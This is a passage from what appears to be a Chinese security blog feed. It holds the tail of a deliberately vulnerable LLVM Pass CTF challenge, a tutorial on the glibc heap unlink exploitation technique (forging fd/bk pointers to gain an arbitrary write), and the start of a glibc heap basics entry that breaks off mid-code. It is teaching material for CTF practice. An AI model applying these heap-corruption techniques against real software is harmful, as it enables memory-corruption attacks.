land&quot;&lt;&lt;&#x27;\n&#x27;;</span><br>chunk_size[i] = sz;<br>money -= sz;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>i++;<br>&#125;<br>&#125;<br>                &#125;<br>              &#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;edit&quot;</span>)&#123; <br>                <span class="hljs-keyword">if</span>(instIter-&gt;<span class="hljs-built_in">getNumOperands</span>()==<span class="hljs-number">3</span>)&#123;<br>                <span class="hljs-type">int</span> idx2 =  <span class="hljs-built_in">dyn_cast</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="hljs-built_in">getArgOperand</span>(<span class="hljs-number">0</span>))-&gt;<span class="hljs-built_in">getZExtValue</span>();<br>                <span class="hljs-keyword">if</span>(idx2&gt;=<span class="hljs-number">0</span> &amp;&amp; idx2&lt;=<span class="hljs-number">9</span>)&#123;<br>                    Value* a = call_inst-&gt;<span class="hljs-built_in">getArgOperand</span>(<span class="hljs-number">1</span>);<br>                    <span class="hljs-keyword">auto</span> a2 = call_inst-&gt;<span class="hljs-built_in">arg_begin</span>()-&gt;<span class="hljs-built_in">get</span>();<br>                    <span class="hljs-keyword">auto</span> a3 = a-&gt;<span class="hljs-built_in">getType</span>();<br>                    <span class="hljs-keyword">auto</span> a4 = <span class="hljs-built_in">dyn_cast</span>&lt;GlobalVariable&gt;(a);<br>                    <span class="hljs-keyword">if</span>(a4)&#123;<br>                    <span class="hljs-keyword">auto</span> a5 = <span class="hljs-built_in">dyn_cast</span>&lt;ConstantDataArray&gt;(a4-&gt;<span class="hljs-built_in">getInitializer</span>());<br>                    <span class="hljs-keyword">if</span>(a5)&#123;<br>                    <span class="hljs-keyword">auto</span> data = a5-&gt;<span class="hljs-built_in">getAsCString</span>();<br>   <span class="hljs-built_in">errs</span>() &lt;&lt; <span class="hljs-string">&quot;edit a land&quot;</span>&lt;&lt;<span class="hljs-string">&#x27;\n&#x27;</span>;                 <br>                    i=<span class="hljs-number">0</span>;<br>                    <span class="hljs-keyword">while</span>(i&lt;data.<span class="hljs-built_in">size</span>() &amp;&amp; i&lt;=chunk_size[idx2]<span class="hljs-number">-8</span>)&#123;<br>*((<span class="hljs-type">uint8_t</span>*)table[idx2]+i) = data[i];<br><br><span class="hljs-keyword">if</span>(*((<span class="hljs-type">uint8_t</span>*)table[idx2]+i)==<span class="hljs-number">0x0f</span>)&#123;<br>i++;<br>*((<span class="hljs-type">uint8_t</span>*)table[idx2]+i) = <span class="hljs-number">0x05</span>;<br>&#125;<br><br><span class="hljs-comment">//errs() &lt;&lt; *((uint8_t*)table[idx2]+i);</span><br><br>i++;<br>&#125;<br><span class="hljs-comment">//errs() &lt;&lt; &quot; at &quot; &lt;&lt; table[idx2] &lt;&lt;&#x27;\n&#x27;;  </span><br>                &#125;<br>                &#125;<br>                &#125;<br>                &#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;locate&quot;</span>)&#123;<br>              <span class="hljs-keyword">if</span>(instIter-&gt;<span class="hljs-built_in">getNumOperands</span>()==<span class="hljs-number">1</span>)&#123;<br>              std::cout &lt;&lt; <span class="hljs-string">&quot;locating treasure!&quot;</span> &lt;&lt; std::endl;<br>              treasuremap = (<span class="hljs-type">uint8_t</span>*)treasuremap + <span class="hljs-built_in">rand</span>()%<span class="hljs-number">0x4000</span> + <span class="hljs-number">0x5000</span>;<br>                <span class="hljs-built_in">buried</span>();<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>                &#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;show&quot;</span>)&#123;<br>              std::cout &lt;&lt; <span class="hljs-string">&quot;Your money now : &quot;</span> &lt;&lt; money &lt;&lt; std::endl;<br>              &#125;<br>            &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;    <br>    <span class="hljs-keyword">return</span> PreservedAnalyses::<span class="hljs-built_in">all</span>();<br>  &#125;<br>&#125;;<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> ::<span class="hljs-function">llvm::PassPluginLibraryInfo LLVM_ATTRIBUTE_WEAK </span><br><span class="hljs-function"><span class="hljs-title">llvmGetPassPluginInfo</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    LLVM_PLUGIN_API_VERSION, <span class="hljs-string">&quot;optimizer&quot;</span>, <span class="hljs-string">&quot;v0.1&quot;</span>,<br>    [](PassBuilder &amp;PB) &#123;<br>      PB.<span class="hljs-built_in">registerPipelineParsingCallback</span>(<br>        [](StringRef Name, FunctionPassManager &amp;FPM,<br>        ArrayRef&lt;PassBuilder::PipelineElement&gt;) &#123;<br>          <span class="hljs-keyword">if</span>(Name == <span class="hljs-string">&quot;optimizer&quot;</span>)&#123;  <br>            FPM.<span class="hljs-built_in">addPass</span>(<span class="hljs-built_in">optimizer</span>());<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>          &#125;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>      );<br>    &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://llvm.org/docs/Reference.html">LLVM Language Reference Manual</a></p><p><a href="https://llvm.org/(%E5%AE%98%E7%BD%91%E7%9A%84Documentation%E5%BE%88%E9%BD%90%E5%85%A8)">https://llvm.org/(官网的Documentation很齐全)</a></p><p><a href="https://blog.csdn.net/sinat_38816924/article/details/114673548">[csdn]clang&amp;llvm简介</a></p><p><a href="https://www.cnblogs.com/Tu9oh0st/p/16143810.html">LLVM从小白到放弃（一）- LLVM概述与LLVM环境搭建 </a></p><p><a href="https://xz.aliyun.com/t/7257">[先知社区]初探LLVM&amp;clang&amp;pass</a></p><p><a href="https://www.jianshu.com/p/1367dad95445">[简书]深入浅出让你理解什么是LLVM</a></p><p><a href="https://bbs.kanxue.com/thread-276219.htm">[看雪]LLVM的IR指令详解</a></p><p><a href="https://www.bilibili.com/video/av93643665/?spm_id_from=333.788.b_765f64657363.1&vd_source=4d7ceec86e24de9c1f10dcb04b1715f0">[理论基础]南京大学软件分析课程</a></p><p>《LLVM编译器实战教程》(Getting Started with LLVM Core Libraries) </p><p><a href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_7">[看雪]LLVM PASS PWN 总结</a></p>]]></content>
    
    
    <categories>
      
      <category>软件测试&amp;漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LLVM</tag>
      
      <tag>Pass</tag>
      
      <tag>IR</tag>
      
      <tag>编译器</tag>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unlink</title>
    <link href="/2023/05/18/unlink/"/>
    <url>/2023/05/18/unlink/</url>
    
    <content type="html"><![CDATA[<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>glibc2.23 unlink源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span><br>    FD = P-&gt;fd;      <br>    BK = P-&gt;bk;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      <br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  <br>    <span class="hljs-keyword">else</span> &#123;      <br>        FD-&gt;bk = BK;      <br>        BK-&gt;fd = FD;      <br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)      <br>            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)      <br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    <br>      malloc_printerr (check_action,      <br>       <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    <br>       P, AV);      <br>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>) &#123;      <br>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)      <br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      <br>                <span class="hljs-keyword">else</span> &#123;      <br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;     <br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      <br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      <br>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      <br>                  &#125;      <br>              &#125; <span class="hljs-keyword">else</span> &#123;      <br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      <br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      <br>              &#125;      <br>          &#125;      <br>      &#125;      <br>&#125;<br></code></pre></td></tr></table></figure><p>glibc 2.31unlink源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">unlink_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))<span class="hljs-comment">//多了这个检测，要求当前的chunk_size == next_chunk的prev_size</span><br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br><br>  mchunkptr fd = p-&gt;fd;<br>  mchunkptr bk = p-&gt;bk;<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br><br>  fd-&gt;bk = bk;<br>  bk-&gt;fd = fd;<br>  <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p<br>  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)<br>malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br><br>      <span class="hljs-keyword">if</span> (fd-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize == p)<br>    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;<br>      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;<br>    &#125;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.31比2.23多了chunk_size &#x3D;&#x3D; next_chunk的prev_size的检测，prev_size位正常情况下都是能修改的，更不用说能修改prev_inuse位的情况，所以影响不大，下面以2.23为例</p><h2 id="1-哪些情况下会unlink"><a href="#1-哪些情况下会unlink" class="headerlink" title="1.哪些情况下会unlink"></a>1.哪些情况下会unlink</h2><p><strong>malloc</strong><br>从恰好大小合适的largebin中获取chunk，发生unlink<br>从比malloc要求大的largebin中取chunk，发生unlink<br><strong>Free</strong><br>后向合并,合并物理相邻低物理地址空闲chunk时<br>前向合并,合并物理相邻高物理地址空闲chunk时(top chunk除外)</p><p>合并时对被合并的chunk的大小无要求，前向合并时，在低地址的chunk中构造一个被合并的chunk，同时将高地址chunk的prev_size位设置成被合并chunk的大小(包括chunk_header)，size位的最低地址设置为0</p><p><strong>malloc_consolidate</strong><br>后向合并,合并物理相邻低地址空闲chunk时。<br>前向合并，合并物理相邻高地址空闲 chunk时（top chunk除外）<br><strong>realloc</strong></p><p>前向扩展，合并物理相邻高地址空闲chunk（除top chunk)</p><h3 id="为什么small-bin和unsorted-bin不发生unlink"><a href="#为什么small-bin和unsorted-bin不发生unlink" class="headerlink" title="为什么small bin和unsorted bin不发生unlink"></a>为什么small bin和unsorted bin不发生unlink</h3><p><a href="https://www.52pojie.cn/thread-1581911-1-1.html">glibc malloc和free源码解析</a></p><p>事实上small bin和unsorted bin是在malloc函数中进行脱链的，而不是通过unlink函数，当malloc的chunk需要从small bin和unsorted bin中取出时，进行类似unlink中的操作</p><p>下面是malloc函数中small bin的分配源码，关键是这几句，victim指向双向链表末尾的small chunk（small bin采用先进先出策略），该chunk的fd指向链表头，即代码中的bin，bk指向前一个chunk</p><p> if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))</p><p>bck &#x3D; victim-&gt;bk;</p><p>bin-&gt;bk &#x3D; bck;<br>bck-&gt;fd &#x3D; bin;</p><p>这个过程其实和unlink很像，但问题在于bin是不可控的，如果按照unlink的利用思路，bin-&gt;bk &#x3D; bck;不仅无法通过fd来指定地址，还会破坏链表，bck-&gt;fd &#x3D; bin;可以由bk来指定要修改的地址，但是内容固定为bin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS             128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                              \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">     hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">     (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">     processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">     anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">   */</span><br><br>  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>    &#123;<br>      idx = smallbin_index (nb);<br>      bin = bin_at (av, idx);<br><br>      <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>            malloc_consolidate (av);<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              bck = victim-&gt;bk;<br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>                &#123;<br>                  errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                  <span class="hljs-keyword">goto</span> errout;<br>                &#125;<br>              set_inuse_bit_at_offset (victim, nb);<br>              bin-&gt;bk = bck;<br>              bck-&gt;fd = bin;<br><br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="2-unlink时的漏洞及利用"><a href="#2-unlink时的漏洞及利用" class="headerlink" title="2.unlink时的漏洞及利用"></a>2.unlink时的漏洞及利用</h2><p>默认64位</p><p>关键代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">FD = P-&gt;fd;      <br>BK = P-&gt;bk;<br><br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))<br><br>FD-&gt;bk = BK;      <br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure><p>绕过检测要求：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">p-&gt;fd-&gt;bk = p     <br>p-&gt;bk-&gt;fd = p<br>等价于<br>*(*(P+<span class="hljs-number">0X10</span>)+<span class="hljs-number">0X18</span>) = P<br>*(*(P+<span class="hljs-number">0X18</span>)+<span class="hljs-number">0X10</span>) = P <br>等价于<br>FD = &amp;p - <span class="hljs-number">0x18</span>  #&amp;p为heap_array中当前chunk(被合并chunk)的指针的存放地址<br>BK = &amp;p - <span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure><p> 也就是说把被unlink的chunk的<strong>fd和bk分别设置成&amp;p - 0x18和&amp;p - 0x10</strong>就能<strong>绕过检测</strong>，这里需要题目中存在一个存放p指针的数据结构</p><p><strong>p是heap_array中存放的指针（指向低地址的chunk）</strong></p><p><strong>p是heap_array中存放的指针（指向低地址的chunk）</strong></p><p><strong>p是heap_array中存放的指针（指向低地址的chunk）</strong></p><p>重要的话说三遍，高地址的chunk被合并后会被清空</p><p>绕过检测后执行</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">FD-&gt;<span class="hljs-keyword">bk </span>= <span class="hljs-keyword">BK;</span>      <br><span class="hljs-keyword">BK-&gt;fd </span>= FD;<br>等价于<br>p = &amp;p - <span class="hljs-number">0x10</span><br>p = &amp;p - <span class="hljs-number">0x18</span><br></code></pre></td></tr></table></figure><p>p是原本指向被unlink的chunk的chunk头的指针，此时已经指向了&amp;p-0x18，假设p原本被存放在bss段的一个数组(heap_array)中，那么此时修改p原本指向的chunk的内容，就变成了修改bss段chunk头首地址在&amp;p-0x18的fake chunk的内容，通常就可以修改存放chunk指针的数组了</p><p>总结：</p><p>条件：</p><p>bss段存在chunk指针数组heap_arr(经典的用法)</p><p>第一种情况：存在uaf，使被合并chunk在被free后还能修改chunk中的fd和bk指针</p><p>第二种情况：存在堆溢出，将被合并的chunk伪装成释放状态</p><p>构造：一般是后向合并，即free掉高地址的chunk，去合并低地址的chunk。在被合并chunk的usr_data中再伪造一个chunk，构造该chunk的fd和bk(fake_fd &#x3D; &amp;p - 0x18   fake_bk &#x3D; &amp;p - 0x10)，同时将高地址chunk的prev_size位设置成伪造的chunk的大小(包括chunk_header)，size位的最低地址设置为0。</p><p>效果：</p><p>p &#x3D; &amp;p - 0x18</p><p><strong>p是heap_array中存放的指针（指向低地址的chunk）</strong>，&amp;p是该指针在heap_array中的地址，unlink后再去修改该指针指向的chunk的内容就变成了修改heap_array的内容</p><h2 id="3-例题："><a href="#3-例题：" class="headerlink" title="3.例题："></a>3.例题：</h2><h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h2><h2 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h2>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unlink</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>glibc堆漏洞利用基础</title>
    <link href="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="glibc堆-ptmalloc-漏洞利用基础"><a href="#glibc堆-ptmalloc-漏洞利用基础" class="headerlink" title="glibc堆(ptmalloc)漏洞利用基础"></a>glibc堆(ptmalloc)漏洞利用基础</h1><p>​                                     虚拟内存示意图</p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98.jpg" alt="虚拟内存"></p><h2 id="1-Arena和malloc-state"><a href="#1-Arena和malloc-state" class="headerlink" title="1.Arena和malloc_state"></a>1.Arena和malloc_state</h2><p>arena即堆内存本身,概念上arena &gt; heap &gt; chunk</p><p>主线程的arena称为main_arena,由sbrk函数向内核申请一大片内存创建，最开始调用sbrk函数创建大小为(128 KB + chunk_size) align 4KB的空间作为heap。当已经申请的内存不够时会调用sbrk向系统申请内存给 <code>malloc_state.top</code>，使brk指针向上沿伸，但如果沿伸到了内存映射段，则调用mmap映射一块内存给main_arena，此时brk不再指向main_arena顶部,main_arena将无法被收回。</p><p>其它线程的arena称为thread_arena,最开始调用 mmap 映射一块大小为HEAP_MAX_SIZE（32 位系统上默认为 1MB，64 位系统上默认为 64MB）的空间作为 sub-heap。当不够用时，会调用 mmap 映射一块新的 sub-heap，也就是增加 top chunk 的大小，每次 heap 增加的值都会对齐到4KB。这样，一个thread_arena由多个heap构成，每个heap均由mmap获得，最大为1M，多个heap间可能不相邻,top chunk在最高地址的heap中，每个heap的最低地址的_heap_info中的prev指针指向前一个heap。</p><p><strong>泄露libc</strong>：在能够查看内存分配的环境下（本地<code>vmmap</code>，远程环境通过<strong>传非法地址</strong>泄露内存分配），通过申请大内存块，可通过利用<code>mmap</code>分配到的内存块地址与<code>libc</code>基址之间的固定偏移量泄露<code>libc</code>地址。</p><p>多个arena间通过链表连接，如下</p><p>main_arena —&gt; arena1 —&gt; arena2 —&gt; ………..</p><p>arena数量上限与系统和处理器核心数有关，并且有锁的机制，如果所有arena都上锁了，线程需要等待</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">32</span>位系统中：<br>     <span class="hljs-attribute">Number</span> of arena = <span class="hljs-number">2</span> * number of cores + <span class="hljs-number">1</span>.<br><span class="hljs-attribute">64</span>位系统中：<br>     <span class="hljs-attribute">Number</span> of arena = <span class="hljs-number">8</span> * number of cores + <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>malloc_state是一个结构体，thread arena对应的malloc_state存储在各自本身的arena的_heap_info上方， _heap_info在每个heap的低地址开头.</p><p>main_arena的malloc_state是一个全局变量，在 libc.so 的数据段,偏移固定，所以知道了main_arena的地址就能泄露libc的基址</p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/main_arena.jpg" alt="main_arena"></p><p><img src="/2023/05/18/glibc%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%9F%BA%E7%A1%80/thread_arena.jpg" alt="thread_arena"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Serialize access.  */</span><br>  __libc_lock_define (, mutex);<span class="hljs-comment">//用于进程间的互斥，同一个arena同时只能被一个进程访问</span><br><br>  <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>  <span class="hljs-type">int</span> flags;<span class="hljs-comment">//表示arena是否存在fastbin或者内存是否连续等信息</span><br><br>  <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>  <span 